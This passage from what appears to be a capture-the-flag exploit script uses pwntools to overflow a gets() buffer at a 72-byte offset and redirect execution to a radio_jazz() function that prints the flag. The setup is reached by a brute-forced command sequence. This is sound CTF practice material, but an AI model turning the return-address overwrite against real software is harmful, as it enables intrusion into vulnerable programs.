...
Reach a vulnerable function that used gets().
To do so you had to input the correct sequence of commands
with the correct radio station. I reached that by bruteforcing
'''
unlock_brodcast()
bof = 72

# radio_jazz() prints out the flag
payload = flat({bof:[
    exe.sym['radio_jazz']
    ]})
io.sendline(payload)
